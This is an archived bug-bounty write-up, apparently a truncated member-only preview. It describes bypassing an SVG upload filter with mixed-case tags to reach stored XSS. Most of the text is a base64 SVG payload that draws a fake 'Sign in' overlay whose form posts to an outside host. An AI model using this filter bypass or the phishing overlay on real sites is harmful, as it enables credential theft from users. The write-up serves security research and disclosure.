# How I bypass CSP sandbox and find Stored XSS

- **Source URL:** https://l4zyhacker.medium.com/how-i-bypass-csp-sandbox-and-find-stored-xss-7bb2b5795554?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250811064838/https://l4zyhacker.medium.com/how-i-bypass-csp-sandbox-and-find-stored-xss-7bb2b5795554?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10487 (id 10487)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Member-only story

# How I bypass CSP sandbox and find Stored XSS

3 min readJust now

When I hunted in a private program, I found an SVG file upload. But have the filter here, they don’t allow \<xml> and \<svg> tags in the payload.

To bypass this is quite simple, use upper-case \<Xml> or \<sVg>. But have some problems when using upper-case, it is ‘broken file’

SVG file when using \<sVg> is ’empty’ in front, try this to get more information.

`data:image/svg+xml;base64,PFN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPgogICAgPGRpdiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CiAgICAgIDxkaXYgc3R5bGU9InBvc2l0aW9uOmZpeGVkO3BhZGRpbmc6MTAlO3BhZGRpbmctcmlnaHQ6MTAwJTtsZWZ0Oi05JTt0b3A6LTIwJTtiYWNrZ3JvdW5kOndoaXRlO3BhZGRpbmctYm90dG9tOjEwMCU7Ij4KICAgICAgICA8c2VjdGlvbiBzdHlsZT0ibWFyZ2luLWxlZnQ6NTAwcHg7cGFkZGluZzozMHB4OyI+CiAgICAgICAgICA8aDIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyOyI+U2lnbiBpbjwvaDI+CiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iaHR0cHM6Ly9udXUuaW5mby8iIG1ldGhvZD0iUE9TVCI+CgkJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJtYW5nYSYjOTU7aWQiIHZhbHVlPSIyMDc5MDIiIC8+CgkJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjaGFwdGVyJiM5NTtpZCIgdmFsdWU9IjAiIC8+CgkJCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJwYWdlJiM5NTtzbHVnIiB2YWx1ZT0iMCIgLz4KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTdWJtaXQgcmVxdWVzdCIgLz4KICAgICAgICAgICAgPGRpdiBzdHlsZT0idGV…`
